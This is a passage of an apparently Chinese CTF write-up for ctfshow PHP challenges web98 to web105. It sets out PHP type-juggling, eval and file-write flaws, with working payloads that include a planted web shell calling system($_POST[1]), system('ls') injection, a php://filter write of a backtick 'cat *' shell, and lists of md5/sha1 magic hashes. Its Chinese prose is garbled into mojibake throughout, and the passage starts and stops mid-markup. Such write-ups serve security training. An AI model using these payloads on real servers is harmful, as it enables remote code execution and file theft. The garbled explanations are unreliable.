punctuation">]</span><span class="token operator">==</span><span class="token string single-quoted-string">'flag'</span><span class="token operator">?</span><span class="token variable">$flag</span><span class="token punctuation">:</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </code></pre><p>ÁúãÂÆå‰∏ÄÂ§¥ÈõæÊ∞¥</p><p><a href="https://www.php.cn/php-notebook-172859.html">phpÂáΩÊï∞ÁöÑ‰º†ÂÄº‰∏é‰º†ÂùÄ(ÂºïÁî®)ËØ¶Ëß£</a></p><p>ËÄÉÁÇπÊòØPHPÈáåÈù¢ÁöÑ‰∏âÂÖÉËøêÁÆóÁ¨¶Âíå‰º†ÂùÄ(ÂºïÁî®) ‰º†ÂùÄ(ÂºïÁî®)ÊúâÁÇπÂÉècËØ≠Ë®ÄÈáåÈù¢ÁöÑÂú∞ÂùÄ Êàë‰ª¨ÂèØ‰ª•‰øÆÊîπ‰∏Ä‰∏ã‰ª£Á†Å</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$_GET</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token variable">$_POST</span><span class="token punctuation">;</span><span class="token comment">//Âè™Ë¶ÅÊúâËæìÂÖ•ÁöÑgetÂèÇÊï∞Â∞±Â∞ÜgetÊñπÊ≥ïÊîπÂèò‰∏∫postÊñπÊ≥ï(‰øÆÊîπ‰∫ÜgetÊñπÊ≥ïÁöÑÂú∞ÂùÄ)</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token string double-quoted-string">"flag"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$_GET</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token variable">$_COOKIE</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">;</span></span></code></pre><p>ÊâÄ‰ª•Êàë‰ª¨Âè™ÈúÄË¶Å GET‰∏Ä‰∏™?1(Âõ†‰∏∫GET‰º†ÂÄºË∞ÉÁî®‰∫ÜPOSTÔºåÊâÄ‰ª•Êó†ÊâÄË∞ì) Âä† POST‰∏Ä‰∏™HTTP_FLAG&#x3D;flag </p><h4 id="web99-in-array"><a href="#web99-in-array" class="headerlink" title="web99(in_array)"></a>web99(in_array)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$allow</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//ËÆæÁΩÆ‰∏∫Êï∞ÁªÑ</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">36</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">0x36d</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">array_push</span><span class="token punctuation">(</span><span class="token variable">$allow</span><span class="token punctuation">,</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//ÂêëÊï∞ÁªÑÈáåÈù¢ÊèíÂÖ•ÈöèÊú∫Êï∞</span><span class="token punctuation">&#125;</span> i<span class="token function">f</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'n'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'n'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$allow</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//in_array()ÂáΩÊï∞ÊúâÊºèÊ¥û Ê≤°ÊúâËÆæÁΩÆÁ¨¨‰∏â‰∏™ÂèÇÊï∞ Â∞±ÂèØ‰ª•ÂΩ¢ÊàêËá™Âä®ËΩ¨Êç¢eg:n=1.phpËá™Âä®ËΩ¨Êç¢‰∏∫1</span><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'n'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//ÂÜôÂÖ•1.phpÊñá‰ª∂ ÂÜÖÂÆπÊòØ&lt;?php system($_POST[1]);</span><span class="token delimiter important">?></span></span>&#125;?></code></pre><p>array_push‚Äî‚ÄîÂæÄÊï∞ÁªÑÂ∞æÈÉ®ÊèíÂÖ•ÂÖÉÁ¥†<br>rand(1,$i)‚Äî‚ÄîÈöèÊú∫ÁîüÊàê1-877‰πãÈó¥ÁöÑÊï∞<br>&#x2F;&#x2F;ÊâÄ‰ª•array_push($allow, rand(1,$i))Â∞±ÊòØÂæÄÊï∞ÁªÑ‰∏≠ÊèíÂÖ•1-877‰πãÈó¥ÁöÑÊï∞Â≠ó<br>in_array‚Äî‚ÄîÊêúÁ¥¢Êï∞ÁªÑ‰∏≠ÊòØÂê¶Â≠òÂú®ÊåáÂÆöÁöÑÂÄº:<br>in_array(search,array,type)<br>search‰∏∫ÊåáÂÆöÊêúÁ¥¢ÁöÑÂÄº<br>array‰∏∫ÊåáÂÆöÊ£ÄÁ¥¢ÁöÑÊï∞ÁªÑ<br>type‰∏∫TRUEÂàô ÂáΩÊï∞Ëøò‰ºöÊ£ÄÊü• searchÁöÑÁ±ªÂûãÊòØÂê¶Âíå array‰∏≠ÁöÑÁõ∏Âêå</p><p>Áªº‰∏äÔºåÊàë‰ª¨ÂèØ‰ª•ÂèëÁé∞Êï∞ÁªÑ‰∏≠ÁöÑÂÄºÊòØintÔºåËÄåÂú®Âº±Á±ªÂûã‰∏≠ÂΩìphpÂ≠óÁ¨¶‰∏≤ÂíåintÊØîËæÉÊó∂,Â≠óÁ¨¶‰∏≤‰ºöË¢´ËΩ¨Êç¢ÊàêintÔºåÊâÄ‰ª• Â≠óÁ¨¶‰∏≤‰∏≠Êï∞Â≠óÂêéÈù¢ÁöÑÂ≠óÁ¨¶‰∏≤‰ºöË¢´ÂøΩÁï•„ÄÇÈ¢òÁõÆ‰∏≠ÁöÑin_arrayÊ≤°ÊúâËÆæÁΩÆtype,Êàë‰ª¨ÂèØ‰ª•ËæìÂÖ•Â≠óÁ¨¶‰∏≤5.php(Ê≠§Â§ÑÊï∞Â≠óÈöèÊÑèÔºåÂè™Ë¶ÅÂú®rand(1,0x36d)‰πãÈó¥Âç≥ÂèØ)ÔºåËΩ¨Êç¢‰πãÂêé‰πüÂ∞±ÊòØ5</p><p>ÁúãÂà∞file_put_contentsÔºåÂèØ‰ª•‰ΩøÁî®php‰º™ÂçèËÆÆ</p><h4 id="web100-is-numeric-ËøêÁÆóÁ¨¶‰ºòÂÖàÁ∫ß"><a href="#web100-is-numeric-ËøêÁÆóÁ¨¶‰ºòÂÖàÁ∫ß" class="headerlink" title="web100(is_numeric ËøêÁÆóÁ¨¶‰ºòÂÖàÁ∫ß)"></a>web100(is_numeric ËøêÁÆóÁ¨¶‰ºòÂÖàÁ∫ß)</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ctfshow.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//flag in class ctfshow;</span><span class="token variable">$ctfshow</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ctfshow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$v1</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$v2</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$v3</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$v0</span><span class="token operator">=</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$v0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;/"</span><span class="token punctuation">,</span> <span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token comment">// v2‰∏çËÉΩÊúâ;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;/"</span><span class="token punctuation">,</span> <span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token comment">// v3ÂøÖÈ°ªÊúâ;</span>            <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$v2</span></span>('ctfshow')<span class="token interpolation"><span class="token variable">$v3</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>   <span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>ËøêÁÆóÁ¨¶‰ºòÂÖàÁ∫ßÔºö**&amp;&amp; &gt; || &gt; &#x3D; &gt; and &gt; or**</p><p><strong>is_numeric()</strong> ÂáΩÊï∞Áî®‰∫éÊ£ÄÊµãÂèòÈáèÊòØÂê¶‰∏∫Êï∞Â≠óÊàñÊï∞Â≠óÂ≠óÁ¨¶‰∏≤„ÄÇ</p><p>ÊòØÊï∞Â≠óÂíåÊï∞Â≠óÂ≠óÁ¨¶‰∏≤ÂàôËøîÂõû TRUEÔºåÂê¶ÂàôËøîÂõû FALSE</p><p><strong>var_dump()<strong>ÂáΩÊï∞ÂèØ‰ª•ËæìÂá∫Â§ö‰∏™ÂÄº„ÄÇ</strong>print_r</strong>‰πüÂèØ‰ª•</p><p><strong>&#x3D;<strong>ÁöÑËøêÁÆóÁ¨¶ÊØî</strong>and</strong>È´ò</p><p>ÂØπ‰∫év0ÁöÑÂÄºÂè™ÈúÄË¶ÅÁúãv1Â∞±ÂèØ‰ª•v2,v3ÊòØÂπ≤Êâ∞</p><p>ÊâÄ‰ª•v1ËæìÂÖ•Êï∞Â≠ó</p><p>Payload:</p><blockquote><p>?v1&#x3D;11&amp;v2&#x3D;var_dump($ctfshow)&#x2F;<em>&amp;v3&#x3D;</em>&#x2F;;</p><p>?v1&#x3D;1&amp;v2&#x3D;system(‚Äòls‚Äô)&#x2F;<em>&amp;v3&#x3D;</em>&#x2F;;</p></blockquote><p>ÊúÄÂêéflag<code>0x2d</code>Ë¶ÅËΩ¨Âåñ‰∏∫<code>-</code></p><h4 id="web101-ÂèçÂ∞ÑÁ±ª"><a href="#web101-ÂèçÂ∞ÑÁ±ª" class="headerlink" title="web101(ÂèçÂ∞ÑÁ±ª)"></a>web101(ÂèçÂ∞ÑÁ±ª)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$v0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\)|\-|\_|\+|\=|\&#123;|\[|\"|\'|\,|\.|\;|\?|[0-9]/"</span><span class="token punctuation">,</span> <span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\(|\-|\_|\+|\=|\&#123;|\[|\"|\'|\,|\.|\?|[0-9]/"</span><span class="token punctuation">,</span> <span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$v2</span></span>('ctfshow')<span class="token interpolation"><span class="token variable">$v3</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>Ê∂âÂèäÂà∞Á±ªÔºåÂèØ‰ª•ËÄÉËôë‰ΩøÁî® ReflectionClass Âª∫Á´ãÂèçÂ∞ÑÁ±ª„ÄÇ</p><p>new ReflectionClass($class) ÂèØ‰ª•Ëé∑ÂæóÁ±ªÁöÑÂèçÂ∞ÑÂØπË±°ÔºàÂåÖÂê´ÂÖÉÊï∞ÊçÆ‰ø°ÊÅØÔºâ„ÄÇ</p><p>ÂÖÉÊï∞ÊçÆÂØπË±°ÔºàÂåÖÂê´classÁöÑÊâÄÊúâÂ±ûÊÄß&#x2F;ÊñπÊ≥ïÁöÑÂÖÉÊï∞ÊçÆ‰ø°ÊÅØÔºâ„ÄÇ</p><p>payloadÔºöv1&#x3D;1&amp;v2&#x3D;echo new ReflectionClass&amp;v3&#x3D;;</p><p>flag‰∏≠Êúâ‰∫õÂ≠óÁ¨¶ÁªèËøáACSIIÁ†ÅÂèòÊç¢ÔºåÂ•ΩÂÉèËøòÂ∞ë‰∫Ü‰∏Ä‰ΩçÔºåÁàÜÁ†¥Âç≥ÂèØ</p><h4 id="web102-substr-call-user-func"><a href="#web102-substr-call-user-func" class="headerlink" title="web102(substr call_user_func)"></a>web102(substr call_user_func)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$v3</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$v4</span> <span class="token operator">=</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$v4</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// Êà™Âéª‰∫ÜÂâç‰∏§‰∏™Â≠óÁ¨¶</span>    <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">,</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$v3</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span> </code></pre><p>**substr() **:ÂáΩÊï∞ËøîÂõûÂ≠óÁ¨¶‰∏≤ÁöÑ‰∏ÄÈÉ®ÂàÜ</p><p>**call_user_func()**ÔºöÊääÁ¨¨‰∏Ä‰∏™ÂèÇÊï∞‰Ωú‰∏∫ÂõûË∞ÉÂáΩÊï∞‰ΩøÁî®ÔºåÂêéÈù¢ÁöÑÂèÇÊï∞ÊòØËøô‰∏™ÂáΩÊï∞ÁöÑÂèÇÊï∞„ÄÇËøîÂõûË∞ÉÁî®ÂáΩÊï∞ÁöÑËøîÂõûÂÄº„ÄÇÂÖ∂ÂÆûÂ∞±ÊòØ‰∏ÄÁßçÁâπÊÆäÁöÑË∞ÉÁî®ÂáΩÊï∞ÁöÑÊñπÂºè„ÄÇ</p><p><strong>php5</strong>‰∏ãis_numericÂèØËØÜÂà´16ËøõÂà∂ÔºåÂ¶Ç0x2eÔºåÁÑ∂ÂêéË∞ÉÁî®hex2binËΩ¨ÊàêÂ≠óÁ¨¶‰∏≤ÂÜôÂÖ•Êú®È©¨Ôºå‰ΩÜÈ¢òÁõÆÁéØÂ¢ÉÊ≤°ÈÖçÂ•ΩÔºåÊòØ<strong>php7</strong>,ÊâÄ‰ª•Ë¶ÅÂè¶Êç¢ÊñπÊ≥ï„ÄÇ<br>Áî®‰º™ÂçèËÆÆÂÜôÂÖ•ÔºåÊâÄ‰ª•ÈúÄË¶Åbase64ÁºñÁ†ÅÂêéËΩ¨Êàê16ËøõÂà∂ÂÖ®ÊòØÊï∞Â≠óÁöÑÂ≠óÁ¨¶‰∏≤</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token variable">$a</span><span class="token operator">=</span><span class="token string single-quoted-string">'&lt;?=`cat *`;'</span><span class="token punctuation">;</span> <span class="token variable">$b</span><span class="token operator">=</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//$a=PD89YGNhdCAqYDs=</span> <span class="token variable">$c</span><span class="token operator">=</span><span class="token function">bin2hex</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'PD89YGNhdCAqYDs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">echo</span> <span class="token variable">$c</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span> ÂæóÂà∞5044383959474e6864434171594473</code></pre><p><strong>PHPÁü≠Ê†áÁ≠æ</strong></p><?=(Ë°®ËææÂºè)?><p>Á≠â‰ª∑‰∫é<?php echo (Ë°®ËææÂºè)?></p><p>Payload:</p><blockquote><p>GET:?v2&#x3D;115044383959474e6864434171594473&amp;v3&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;1.php</p><p>POST:v1&#x3D;hex2bin</p></blockquote><h4 id="web103"><a href="#web103" class="headerlink" title="web103"></a>web103</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$v4</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">,</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/.*p.*h.*p.*/i"</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$v3</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Sorry'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>Âä†‰∫Ü‰∏™È∏°ËÇãÁöÑÈôêÂà∂ÔºåÂõ†‰∏∫Êú¨Êù•Â∞±ÊòØÁî®base64Âä†ÂØÜÂêéÁöÑÔºåÊâÄ‰ª•Ê≤°‰ªÄ‰πàÂΩ±Âìç</p><h4 id="web104-md5-sha1"><a href="#web104-md5-sha1" class="headerlink" title="web104(md5 sha1)"></a>web104(md5 sha1)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>shalÂáΩÊï∞Â∞±ÊòØËÆ°ÁÆóÊï£ÂàóÂáΩÊï∞ÔºåÂèØ‰ª•ÁêÜËß£‰∏∫‰∏Ä‰∏™‰∏çÂèØÈÄÜÁöÑÂä†ÂØÜÂáΩÊï∞ÔºåËøôÈ¢òÊ≤°Âï•ËøáÊª§ÔºåÁõ¥Êé•‰º†‰∏§‰∏™Áõ∏ÂêåÁöÑÂèÇÊï∞Â∞±Â•Ω‰∫ÜÔºåÊûÑÈÄ†payload</p><p>ÊàñËÄÖ‰ΩøÁî®Êï∞ÁªÑ‰πüÂèØ‰ª•ÁªïËøá</p><p>ÂÄºÁöÑÂà§Êñ≠ÊòØ‰ΩøÁî® <code>==</code>ÔºåÊâÄ‰ª•ÊâæÂä†ÂØÜÂêé 0e ÂºÄÂ§¥ÁöÑ‰∏§‰∏™ÂÄº‰πüÂèØ‰ª•„ÄÇ</p><blockquote><p>aaK1STfY -&gt; 0e76658526655756207688271159624026011393</p><p>aaO8zKZF -&gt; 0e89257456677279068558073954252716165668</p></blockquote><p>‰ª•‰∏ãËøô‰∫õÂ≠óÁ¨¶‰∏≤Ôºåmd5ÂìàÂ∏å‰πãÂêéÈÉΩÊòØ0eÂºÄÂ§¥ÁöÑÔºö</p><blockquote><p>s878926199a -&gt; 0e545993274517709034328855841020</p><p>s155964671a -&gt; 0e342768416822451524974117254469</p><p>s214587387a -&gt; 0e848240448830537924465865611904 </p><p>s214587387a -&gt; 0e848240448830537924465865611904 </p><p>QLTHNDT -&gt; 0e405967825401955372549139051580 </p><p>QNKCDZO -&gt; 0e830400451993494058024219903391 </p><p>EEIZDOI -&gt; 0e782601363539291779881938479162 </p><p>240610708 -&gt; 0e462097431906509019562988736854 </p><p>4011627063 -&gt; 0e485805687034439905938362701775 </p><p>4775635065 -&gt; 0e998212089946640967599450361168 </p><p>4790555361 -&gt; 0e643442214660994430134492464512 </p><p>5432453531 -&gt; 0e512318699085881630861890526097 </p><p>5579679820 -&gt; 0e877622011730221803461740184915 </p><p>5585393579 -&gt; 0e664357355382305805992765337023 </p><p>6376552501 -&gt; 0e165886706997482187870215578015 </p><p>7124129977 -&gt; 0e500007361044747804682122060876 </p><p>7197546197 -&gt; 0e915188576072469101457315675502 </p><p>7656486157 -&gt; 0e451569119711843337267091732412</p></blockquote><h4 id="web105-phpÂèòÈáèË¶ÜÁõñ"><a href="#web105-phpÂèòÈáèË¶ÜÁõñ" class="headerlink" title="web105(phpÂèòÈáèË¶ÜÁõñ)"></a>web105(phpÂèòÈáèË¶ÜÁõñ)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$error</span><span class="token operator">=</span><span class="token string single-quoted-string">'‰Ω†ËøòÊÉ≥Ë¶ÅflagÂòõÔºü'</span><span class="token punctuation">;</span><span class="token variable">$suces</span><span class="token operator">=</span><span class="token string single-quoted-string">'Êó¢ÁÑ∂‰Ω†ÊÉ≥Ë¶ÅÈÇ£Áªô‰Ω†ÂêßÔºÅ'</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_GET</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=></span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token operator">===</span><span class="token string single-quoted-string">'error'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"what are you doing?!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$$key</span><span class="token operator">=</span><span class="token variable">$$value</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_POST</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=></span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token operator">===</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"what are you doing?!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$$key</span><span class="token operator">=</span><span class="token variable">$$value</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span 